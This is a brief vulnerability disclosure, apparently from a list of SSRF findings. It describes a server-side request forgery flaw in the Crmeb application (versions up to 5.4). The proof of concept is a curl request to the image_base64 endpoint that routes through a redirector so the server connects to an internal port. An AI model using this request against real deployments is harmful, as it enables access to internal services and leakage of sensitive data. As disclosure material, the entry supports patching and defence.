### Crmeb

- **Application**: Crmeb<= 5.4
- **Threat Impact**: Sensitive data leakage
- **POC**:
  1. Listen on 8888 on server side
  1. `curl -X POST  "http://127.0.0.1:8011/api/image_base64" -d "image=https://ssrf.localdomain.pw/img-without-body/301-http-127.0.0.1:8888-.i.jpg" -d "code=https://picsum.photos/200.jpg?url=https://mp.weixin.qq.com/cgi-bin/showqrcode"`
  1. Receive a request on server side. 

